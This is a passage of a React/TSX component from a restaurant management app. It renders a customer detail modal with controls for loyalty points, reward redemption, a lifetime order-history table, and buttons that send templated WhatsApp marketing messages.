                    className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs shadow-xs"
                  >
                    + Add Points
                  </button>
                  <button
                    onClick={() => handleAdjustPointsInDetail(false)}
                    className="px-3 py-1.5 bg-amber-600 hover:bg-amber-700 text-white font-bold rounded-xl text-xs shadow-xs"
                  >
                    - Redeem
                  </button>
                </div>
              </div>

              {/* Rewards Catalog Redemption — replaces the flat "1 pt = ₹1"
                  assumption above with real, named rewards. */}
              {(() => {
                const rewards = CustomerRepository.getRewards().filter((r) => r.isActive);
                if (rewards.length === 0) return null;
                return (
                  <div className="space-y-2">
                    <h4 className="font-black text-xs text-jaman-navy uppercase tracking-wide">Redeem a Reward</h4>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {rewards.map((reward) => {
                        const canAfford = (detailCustomer.loyaltyPoints || 0) >= reward.pointsCost;
                        return (
                          <div key={reward.id} className="p-3 bg-jaman-cream border border-jaman-border rounded-xl flex items-center justify-between gap-2">
                            <div className="min-w-0">
                              <div className="font-bold text-jaman-navy truncate">{reward.name}</div>
                              <div className="text-[10px] text-slate-500 truncate">{reward.description}</div>
                            </div>
                            <button
                              onClick={() => handleRedeemReward(reward.id, reward.name, reward.pointsCost)}
                              disabled={!canAfford}
                              className={`shrink-0 px-2.5 py-1.5 rounded-lg text-[10px] font-bold ${
                                canAfford
                                  ? 'bg-amber-600 hover:bg-amber-700 text-white cursor-pointer'
                                  : 'bg-slate-100 text-slate-400 cursor-not-allowed'
                              }`}
                            >
                              {reward.pointsCost} pts
                            </button>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                );
              })()}

              {/* Complete Order History for this Customer */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <h4 className="font-black text-xs text-jaman-navy uppercase tracking-wide flex items-center gap-1.5">
                    <ShoppingBag className="w-3.5 h-3.5 text-jaman-saffron" />
                    <span>Lifetime Order & Bill History ({(detailCustomer as any).orders?.length || 0} Orders)</span>
                  </h4>
                </div>

                {!(detailCustomer as any).orders || (detailCustomer as any).orders.length === 0 ? (
                  <div className="bg-jaman-cream p-4 rounded-2xl text-center text-slate-400 font-medium">
                    No previous order bills recorded for this mobile number yet.
                  </div>
                ) : (
                  <div className="border border-slate-200 rounded-2xl overflow-hidden">
                    <table className="w-full text-left text-xs">
                      <thead className="bg-jaman-cream border-b border-slate-200 font-bold text-slate-500 uppercase">
                        <tr>
                          <th className="p-2.5">Invoice #</th>
                          <th className="p-2.5">Date & Time</th>
                          <th className="p-2.5">Type / Table</th>
                          <th className="p-2.5">Items</th>
                          <th className="p-2.5">Tender</th>
                          <th className="p-2.5 text-right">Amount</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-100 font-medium">
                        {(detailCustomer as any).orders.map((ord: Order) => (
                          <tr key={ord.id} className="hover:bg-slate-50">
                            <td className="p-2.5 font-mono font-bold text-jaman-navy">#{ord.orderNumber}</td>
                            <td className="p-2.5 text-slate-500 font-mono text-[11px]">
                              {formatDate(ord.createdAt)} {formatTime(ord.createdAt)}
                            </td>
                            <td className="p-2.5">
                              {ord.orderType} {ord.tableNumber ? `(T-${ord.tableNumber})` : ''}
                            </td>
                            <td className="p-2.5 text-slate-600">{ord.items.length} dishes</td>
                            <td className="p-2.5">
                              <span className="px-2 py-0.5 rounded font-bold text-[10px] bg-slate-100 uppercase">
                                {ord.paymentMethod}
                              </span>
                            </td>
                            <td className="p-2.5 text-right font-mono font-black text-emerald-700">
                              {formatINR(ord.totalAmount)}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>

              {/* Automated WhatsApp Campaigns Strip */}
              <div className="bg-jaman-cream p-4 rounded-2xl border border-slate-200 space-y-2">
                <span className="text-[10px] font-black uppercase text-slate-500 block">
                  INSTANT WHATSAPP MARKETING CAMPAIGNS:
                </span>
                <div className="flex flex-wrap gap-2">
                  <button
                    onClick={() => {
                      const msg = `Dear ${detailCustomer.name || 'Guest'}, happy birthday from team ${db.restaurant?.name || 'JAMANVAAR'}! 🎂 Enjoy a complimentary chef special dessert or 15% discount on your dine-in bill today!`;
                      handleSendWhatsApp(detailCustomer.phone, detailCustomer.name || 'Guest', msg);
                    }}
                    className="px-3 py-1.5 bg-white border border-slate-300 hover:bg-emerald-50 hover:border-emerald-400 text-jaman-navy font-bold rounded-xl text-xs flex items-center gap-1.5 transition-all"
                  >
                    <span>🎂 Birthday 15% Offer</span>
                  </button>

                  <button
                    onClick={() => {
                      const msg = `Dear ${detailCustomer.name || 'Guest'}, thank you for dining with us! We have credited loyalty reward points to your phone ${detailCustomer.phone}. Current Balance: ${detailCustomer.loyaltyPoints || 0} Pts!`;
                      handleSendWhatsApp(detailCustomer.phone, detailCustomer.name || 'Guest', msg);
                    }}
                    className="px-3 py-1.5 bg-white border border-slate-300 hover:bg-emerald-50 hover:border-emerald-400 text-jaman-navy font-bold rounded-xl text-xs flex items-center gap-1.5 transition-all"
                  >
                    <span>⭐ Points Balance Notification</span>
                  </button>

                  <button
                    onClick={() => {
                      const msg = `Dear ${detailCustomer.name || 'Guest'}, we missed you at ${db.restaurant?.name || 'JAMANVAAR'}! Reserve your favorite table this weekend and savor our signature dishes.`;
                      handleSendWhatsApp(detailCustomer.phone, detailCustomer.name || 'Guest', msg);
                    }}
                    className="px-3 py-1.5 bg-white border border-slate-300 hover:bg-emerald-50 hover:border-emerald-400 text-jaman-navy font-bold rounded-xl text-xs flex items-center gap-1.5 transition-all"
                  >
                    <span>🔁 We Miss You Re-engagement</span>
                  </button>
                </div>
              </div>

            </div>

            {/* Modal Actions Footer */}
            <div className="p-4 bg-jaman-cream border-t border-slate-200 flex justify-between items-center">
              <button
                onClick={() => {
                  onOpenEditModal(detailCustomer);
                  setDetailCustomer(null);
                }}
                className="px-4 py-2 bg-white border border-slate-300 hover:bg-slate-100 text-jaman-navy font-bold text-xs rounded-xl flex items-center gap-1.5"
              >
                <Edit2 className="w-3.5 h-3.5 text-jaman-saffron" />
                <span>Edit Full Profile</span>
              </button>

              <button
                onClick={() => setDetailCustomer(null)}
                className="px-4 py-2 bg-jaman-navy hover:bg-jaman-darkBorder text-white font-bold text-xs rounded-xl"
              >
                Close
              </button>
            </div>

          </div>
        </div>
      )}

      <LoyaltyProgramModal
        isOpen={isLoyaltyModalOpen}
        onClose={() => setIsLoyaltyModalOpen(false)}
        showToast={showToast}
      />

      <MarketingCampaignsModal
        isOpen={isMarketingModalOpen}
        onClose={() => setIsMarketingModalOpen(false)}
        showToast={showToast}
      />

    </div>
  );
};
